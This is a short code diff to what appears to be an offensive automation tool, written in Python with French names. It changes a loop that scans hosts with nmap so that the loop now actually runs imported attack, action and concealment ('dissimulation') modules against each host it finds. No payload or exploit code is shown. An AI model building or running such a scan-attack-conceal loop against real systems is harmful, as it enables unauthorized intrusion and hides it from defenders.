@@ -34,17 +34,21 @@ class Events():
         while self.isStart:
             
             for (host, port) in nmap(self):
+                print(host, port)
                 for attaque in ATTAQUES:
                     pkg = import_module(attaque)
-                    pkg.Attaque(self, host, port)
+                    att = pkg.Attaque(self, host, port)
+                    att.run()
 
                 for action in ACTIONS:
                     pkg = import_module(action)
-                    pkg.Action(self, host, port)
+                    act = pkg.Action(self, host, port)
+                    act.run()
 
                 for dissimulation in DISSIMULATIONS:
                     pkg = import_module(dissimulation)
-                    pkg.Dissimulation(self, host, port)
+                    dis = pkg.Dissimulation(self, host, port)
+                    dis.run()
             
             sleep(5)
 
